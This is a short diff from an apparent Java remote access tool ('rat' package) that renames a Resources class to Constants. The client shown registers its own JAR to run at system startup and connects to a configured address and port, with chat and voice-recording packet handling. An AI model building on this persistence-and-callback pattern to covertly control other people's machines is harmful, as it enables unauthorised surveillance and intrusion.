@@ -5,7 +5,7 @@ import de.sogomn.rat.gui.IGuiController;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.VoicePacket;
-import de.sogomn.rat.util.Resources;
+import de.sogomn.rat.util.Constants;
 import de.sogomn.rat.util.VoiceRecorder;
 
 public final class Client implements IConnectionObserver, IGuiController {
@@ -92,7 +92,7 @@ public final class Client implements IConnectionObserver, IGuiController {
 	
 	private static void addToStartup() {
 		try {
-			Resources.OS_SERVICE.addToStartup(Resources.JAR_FILE);
+			Constants.OS_SERVICE.addToStartup(Constants.JAR_FILE);
 		} catch (final Exception ex) {
 			ex.printStackTrace();
 		}
@@ -122,8 +122,8 @@ public final class Client implements IConnectionObserver, IGuiController {
 	
 	public static void main(final String[] args) {
 		addToStartup();
-		Resources.setSystemLookAndFeel();
-		startClient(Resources.ADDRESS, Resources.PORT);
+		Constants.setSystemLookAndFeel();
+		startClient(Constants.ADDRESS, Constants.PORT);
 	}
 	
 }
